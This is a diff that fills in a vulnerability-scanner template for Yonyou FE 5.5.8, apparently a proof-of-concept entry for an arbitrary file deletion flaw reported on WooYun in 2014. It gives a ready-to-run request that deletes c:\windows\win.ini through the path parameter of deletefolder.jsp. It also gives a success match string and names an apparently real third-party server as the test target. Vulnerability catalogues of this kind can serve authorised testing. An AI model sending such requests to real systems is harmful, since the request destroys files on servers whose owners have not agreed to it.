@@ -1,27 +1,27 @@
-appname    := 
-appversion := 
-appvendor  := 
+appname    := Yonyou FE
+appversion := 5.5.8
+appvendor  := http://www.yonyou.com/
 
-vulid      := 
-vulpath    := 
-vultype    := 
-vulreferer := 
-vuldesc    := 
-vuleffect  := 
+vulid      := 0410
+vulpath    := /sys/file_setup/deletefolder.jsp
+vultype    := Arbitrary File Deletion
+vulreferer := http://wooyun.org/bugs/wooyun-2014-075068
+vuldesc    := /sys/file_setup/deletefolder.jsp?path= 用于删除,但path变量未做任何限制,导致可删除任意文件
+vuleffect  := 任意文件删除
 # 漏洞公布日期
-vuldate    := 2014-09-
+vuldate    := 2014-09-05
 
 
 tools      := Firefox
 tooldesc   := 浏览器
 
-myname     := 
-shortname  := 
+myname     := flsf
+shortname  := flsf
 
 
 # verify
-info_target_url := 
+info_target_url := /sys/file_setup/deletefolder.jsp?path=c:\windows\win.ini
 info_post_data  := 
-info_match      := 
+info_match      := 删除成功
 info_other_match:= 
-info_test_url   := 
+info_test_url   := http://oa.shunhengli.com:9090/
